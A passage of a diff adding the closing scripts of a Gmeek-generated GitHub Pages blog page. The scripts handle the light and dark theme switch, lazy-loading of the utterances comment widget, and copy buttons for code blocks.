5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek v2.25 https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","P7IVESC/P7IVESC.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
